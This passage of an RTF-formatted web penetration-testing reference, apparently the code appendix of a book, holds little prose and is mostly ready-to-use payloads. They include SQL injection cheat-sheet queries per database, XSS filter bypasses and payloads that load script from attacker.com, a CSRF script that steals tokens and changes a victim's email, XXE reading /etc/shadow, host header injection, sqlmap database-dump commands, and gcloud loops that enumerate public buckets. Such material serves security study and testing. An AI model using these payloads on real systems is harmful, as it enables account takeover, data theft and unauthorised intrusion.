+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 Oracle
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 MS-SQL
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 My SQL
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 PostgreSQL
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clmgf \clvertalt \clshdrawnil \clwWidth10412\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clmrg \clvertalt \clshdrawnil \clwWidth10412\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 Retrieve current database
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 Oracle
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 MS-SQL
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 SELECT db_name()
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 My SQL
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 SELECT database()
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clmgf \clvertalt \clshdrawnil \clwWidth10412\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clmrg \clvertalt \clshdrawnil \clwWidth10412\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 Conditional errors
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 Oracle
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 SELECT CASE WHEN (CONDITION) THEN to char(1/0) ELSE NULL END FROM dual
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 MS-SQL
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 SELECT CASE WHEN (CONDITION) THEN 1/0 ELSE NULL END
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 My SQL
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 SELECT IF(CONDITION)(SELECT table_name FROM information_schema.tables),'a')
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrt\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 PostgreSQL
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 SELECT CASE WHEN (CONDITION) THEN cast(1/0 as text) ELSE NULL END
+\fs29\fsmilli14667 \cell \lastrow\row
+\pard\pardeftab720\partightenfactor0
+
+\fs28 \cf3 \cb4 \
+
+\f2\b Bypassing XSS filters\
+\
+\pard\pardeftab720\li960\sl337\sa133\qj\partightenfactor0
+
+\f1\b0\fs29\fsmilli14667 \cf2 \cb5 " onfocus="alert(document.cookie)\
+<object onerror=alert(1)>\\\
+<body onactivate=alert(1)>\
+\
+"%3cscript%3ealert(document.cookie)%3c/script%3e\
+<scr<script>ipt>alert(document.cookie)</script>\
+\
+http://example.com/?var="%20SRC="http:// attacker/xss.js">\
+<iMg onerror=alert(1) src=a>\
+<[%00]img onerror=alert(1) src=a>\
+\
+<x onclick=alert(1) src=a>Click here</x>\
+\
+<img o[%00]nerror=alert(1) src=a>\
+<img onerror="alert(1)"src=a>\
+<img onerror=a[%00]lert(1) src=a>\
+\
+\pard\pardeftab720\partightenfactor0
+
+\f2\b\fs28 \cf3 \cb4 XSS Payloads\
+\
+\pard\pardeftab720\sl337\sa133\qj\partightenfactor0
+
+\f1\b0\fs29\fsmilli14667 \cf2 \cb5 </script><img src=1 onerror=alert(document.domain)>\
+\
+<object data=javascript:alert(1)>\
+<a href="xsstest">Click here ...</a>\
+\
+<!-- External script -->\
+<script src=http://attacker.com/xss.js></script>\
+<!-- Embedded script -->\
+<script> alert("XSS"); </script>\
+\
+<!-- onload attribute in the <body> tag -->\
+<body onload=alert("XSS")>\
+\
+<!-- background attribute -->\
+<body background="javascript:alert("XSS")">\
+\
+<!-- <img> tag XSS -->\
+<img src="javascript:alert("XSS");">\
+<!--\'a0 tag XSS using lesser-known attributes -->\
+<img dynsrc="javascript:alert('XSS')">\
+<img lowsrc="javascript:alert('XSS')">\
+\
+<!-- <iframe> tag XSS -->\
+<iframe src="http://attacker.com/xss.html">\
+\
+<!-- <input> tag XSS -->\
+<input type="image" src="javascript:alert('XSS');">\
+\
+<!-- <link> tag XSS -->\
+<link rel="stylesheet" href="javascript:alert('XSS');">\
+\
+<!-- <table> tag XSS -->\
+<table background="javascript:alert('XSS')">\
+<!-- <td> tag XSS -->\
+<td background="javascript:alert('XSS')">\
+\
+<!-- <div> tag XSS -->\
+<div style="background-image: url(javascript:alert('XSS'))">\
+<div style="width: expression(alert('XSS'));">\
+\
+<!-- <object> tag XSS -->\
+<object type="text/x-scriptlet" data="http://attacker.com/xss.html">\
+\
+\pard\pardeftab720\sa133\partightenfactor0
+
+\fs26\fsmilli13333 \cf2 \cb1 <script>\
+\'a0 var req = new XMLHttpRequest();\
+\'a0 req.onload = handleResponse;\
+\'a0 req.open('get','/email',true);\
+\'a0 req.send();\
+\'a0 function handleResponse() \{\
+\'a0\'a0\'a0 var token = this.responseText.match(/name="csrf" value="(\\w+)"/)[1];\
+\'a0\'a0\'a0 var changeReq = new XMLHttpRequest();\
+\'a0\'a0\'a0 changeReq.open('post', '/email/change-email', true);\
+\'a0\'a0\'a0 changeReq.send('csrf='+token+'&email=test@hacker.com')\
+\'a0 \};\
+</script>\
+\pard\pardeftab720\sl337\sa133\qj\partightenfactor0
+
+\fs29\fsmilli14667 \cf2 \cb5 \
+\
+
+\f2\b XML Injection\
+\
+
+\f1\b0 <?xml version="1.0" encoding="ISO-8859-1"?>\
+<!DOCTYPE foo [\
+<!ELEMENT foo ANY >\
+<!ENTITY xxe SYSTEM "file:///etc/shadow" >]>\
+<foo>&xxe;</foo>\
+\
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://malicious_website.com/"> ]>\
+\
+
+\f2\b Host Header Injection\
+\
+
+\f1\b0 Request:\
+POST /userdetails/modify HTTP/1.1\
+Host: example.com\
+X-Forwarded-Host: attacker_malicious.com\
+User agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0\
+Accept: text/html,\
+Accept language: en-US,en;q=0.5\
+Content type: application/x-www-form-urlencoded\
+Content length: 790\
+Connection: close\
+Response:\
+HTTP/1.1 302 Found\
+Cache control: no-cache\
+Content length: 134\
+Content type: text/html; charset=utf-8\
+Location: {\field{\*\fldinst{HYPERLINK "https://attacker_malicious.com/"}}{\fldrslt \ul https://attacker_malicious.com}}\ul \
+\
+
+\f2\b \ulnone Chapter 9
+\f1\b0 \
+\
+\pard\pardeftab720\sl368\partightenfactor0
+
+\f0\b\fs32 \cf2 \cb1 Web page HTML code for CSRF\
+\
+\pard\pardeftab720\sa133\partightenfactor0
+
+\f1\b0\fs26\fsmilli13333 \cf2 <html>\
+\'a0 <body>\
+\'a0\'a0\'a0 <form action="https://attacker-website.com/email/change" method="POST">\
+\'a0\'a0\'a0\'a0\'a0 <input type="hidden" name="email" value="hacker@user.net" />\
+\'a0\'a0\'a0 </form>\
+\'a0\'a0\'a0 <script>\
+\'a0\'a0\'a0\'a0\'a0 document.forms[0].submit();\
+\'a0\'a0\'a0 </script>\
+\'a0 </body>\
+</html>\
+\
+
+\f2\b DOM based local file path manipulation \
+\
+
+\f1\b0 FileReader.readAsArrayBuffer()\
+FileReader.readAsBinaryString()\
+FileReader.readAsDataURL()\
+FileReader.readAsText()\
+FileReader.readAsFile()\
+FileReader.root.getFile()\
+FileReader.root.getFile()\
+\
+
+\f2\b Invalid Redirect\
+\
+
+\f1\b0 response.sendRedirect(request.getParameter("input"));\
+$redirect_url = $_GET['input'];\
+header("Location: " . $redirect_url);\
+\
+
+\f2\b Chapter 10\
+\
+Javascript Execution\
+\
+\pard\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\f1\b0\fs32 \cf2 \cb5 The attacker can inject payload www.example. com/?javascript:alert(1) in such scenarios:\
+\pard\pardeftab720\sa133\partightenfactor0
+
+\fs26\fsmilli13333 \cf2 \cb1 var test = location.search.substring(1); \
+if(test) \
+window.location=decodeURIComponent(test)\
+\
+
+\f2\b HTML Injection\
+\
+
+\f1\b0 var userposition=location.href.indexOf("user="); \
+var user=location.href.substring(userposition+5); document.getElementById("Welcome").innerHTML=" Hello, "+user;\
+\'a0\
+var userposition=location.href.indexOf("user="); \
+var user=location.href.substring(userposition+5);\
+\'a0document.write("Hello, " + user +"</h1>");\
+\
+\pard\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 \cb5 The following malicious input can be injected, when executed, it will try to fetch that linked attacker's malicious webpage:\
+\pard\pardeftab720\sa133\partightenfactor0
+
+\fs26\fsmilli13333 \cf2 \cb1 http://attacker.site/page.html?user=<a href=t.ly/XDKwL>\
+\
+
+\f2\b Chapter 11\
+\
+SQLmap\
+\
+\pard\pardeftab720\sl285\sa213\partightenfactor0
+
+\f1\b0 \cf6 sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 \'96dbs\
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf6 -D acuart --tables \
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf6 -D acuart -T artists --columns \
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf6 -D acuart -T artists -C aname --dump \
+\
+
+\f2\b Chapter 12\
+Enumerating Cloud Storage
+\f1\b0 \cf7 \cb8 \
+\pard\pardeftab720\li480\fi-480\sl360\sa213\partightenfactor0
+\cf9 for\cf7 \'a0proj\'a0\cf9 in\cf7 \'a0$(gcloud\'a0projects\'a0list\'a0--format=\cf10 \cb8 "get(projectId)"\cf7 \cb8 );\'a0\cf9 do
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb5       \cf11 echo\cf7 \'a0\cf10 "[*]\'a0scraping\'a0project\'a0\cf12 $proj\cf10 "
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f4\fs18\fsmilli9333 \cf7 \cb8  
+\f1\fs26\fsmilli13333 \'a0\'a0\'a0\'a0\cf9 for\cf7 \'a0bucket\'a0\cf9 in\cf7 \'a0$(gsutil\'a0ls\'a0-p\'a0\cf12 \cb8 $proj\cf7 \cb8 );\'a0\cf9 do
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f4\fs18\fsmilli9333 \cf7 \cb5  
+\f1\fs26\fsmilli13333 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf11 echo\cf7 \'a0\cf10 "\'a0\'a0\'a0\'a0\cf12 $bucket\cf10 "
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\'a0\'a0\'a0\'a0\'a0ACL=\cf10 \cb8 "\cf12 $(gsutil\'a0iam\'a0get\'a0$bucket)\cf10 "
+\f3\fs29\fsmilli14667 \cf2 \cb8 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\'a0\'a0\'a0\'a0all_users=\cf10 "\cf12 $(echo\'a0$ACL\'a0|\'a0grep\'a0allUsers)\cf10 "
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\'a0\'a0\'a0\'a0\'a0\'a0all_auth=\cf10 \cb8 "\cf12 $(echo\'a0$ACL\'a0|\'a0grep\'a0allAuthenticatedUsers)\cf10 "
+\f3\fs29\fsmilli14667 \cf2 \cb8 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf9 if\cf7 \'a0[\'a0-z\'a0\cf10 "\cf12 $all_users\cf10 "\cf7 \'a0]
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf9 then\cf7 \cb5 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0:
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf9 else
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f4\fs18\fsmilli9333 \cf7 \cb5  
+\f1\fs26\fsmilli13333 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf11 echo\cf7 \'a0\cf10 "[!]\'a0Open\'a0to\'a0all\'a0users:\'a0\cf12 $bucket\cf10 "
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf9 fi
+\f3\fs29\fsmilli14667 \cf2 \cb5 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\'a0\'a0\'a0\'a0\'a0\cf9 if\cf7 \'a0[\'a0-z\'a0\cf10 \cb8 "\cf12 $all_auth\cf10 "\cf7 \cb8 \'a0]
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf9 then
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0:
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\'a0\'a0\'a0\cf9 else
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf11 \cb8 echo\cf7 \cb8 \'a0\cf10 \cb8 "[!]\'a0Open\'a0to\'a0all\'a0authenticated\'a0users:\'a0\cf12 $bucket\cf10 "
+\f3\fs29\fsmilli14667 \cf2 \cb8 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\'a0\'a0\'a0    \'a0\cf9 fi
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\'a0\cf9 done
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf9 \cb5 done
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \
+\pard\pardeftab720\sl337\sa133\qj\partightenfactor0
+
+\f2\b\fs29\fsmilli14667 \cf2 \cb5 Find Cloud Run services that permit unauthenticated invocations\
+\
+\pard\pardeftab720\li480\fi-480\sl360\sa213\partightenfactor0
+
+\f4\b0\fs18\fsmilli9333 \cf7 \cb8  
+\f1\fs26\fsmilli13333 \cf9 for\cf7 \'a0proj\'a0\cf9 in\cf7 \'a0$(gcloud\'a0projects\'a0list\'a0--format=\cf10 \cb8 "get(projectId)"\cf7 \cb8 );\'a0\cf9 do
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f4\fs18\fsmilli9333 \cf7 \cb5  
+\f1\fs26\fsmilli13333 \'a0\'a0\'a0\'a0\cf11 echo\cf7 \'a0\cf10 "[*]\'a0scraping\'a0project\'a0\cf12 $proj\cf10 "\cf7 \cb8 \'a0
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0enabled=$(gcloud\'a0services\'a0list\'a0--project\'a0\cf10 "\cf12 $proj\cf10 "\cf7 \'a0|\'a0grep\'a0\cf10 "Cloud\'a0Run\'a0API"\cf7 )
+\f3\fs29\fsmilli14667 \cf2 \cb8 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\'a0\cf9 if\cf7 \'a0[\'a0-z\'a0\cf10 "\cf12 $enabled\cf10 "\cf7 \'a0];\'a0\cf9 then
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\cf11 \cb8 continue
+\f3\fs29\fsmilli14667 \cf2 \cb8 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\'a0\cf9 fi
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\'a0\'a0\cf9 for\cf7 \'a0run\'a0\cf9 in\cf7 \'a0$(gcloud\'a0run\'a0services\'a0list\'a0--platform\'a0managed\'a0--quiet\'a0--project\'a0\cf12 \cb8 $proj\cf7 \cb8 \'a0--format=\cf10 \cb8 "get(name)"\cf7 \cb8 );\'a0\cf9 do
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\'a0\'a0\'a0ACL=\cf10 "\cf12 $(gcloud\'a0run\'a0services\'a0get-iam-policy\'a0$run\'a0--platform\'a0managed\'a0--project\'a0$proj)\cf10 "
+\f3\fs29\fsmilli14667 \cf2 \cb8 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\'a0\'a0\'a0\'a0all_users=\cf10 "\cf12 $(echo\'a0$ACL\'a0|\'a0grep\'a0allUsers)\cf10 "
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0all_auth=\cf10 \cb8 "\cf12 $(echo\'a0$ACL\'a0|\'a0grep\'a0allAuthenticatedUsers)\cf10 "
+\f3\fs29\fsmilli14667 \cf2 \cb5 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb8 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf9 if\cf7 \'a0[\'a0-z\'a0\cf10 \cb8 "\cf12 $all_users\cf10 "\cf7 \cb8 \'a0]
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf9 then\cf7 \cb8 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0:
+\f3\fs29\fsmilli14667 \cf2 \
+
+\f1\fs26\fsmilli13333 \cf7 \cb5 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf9 else
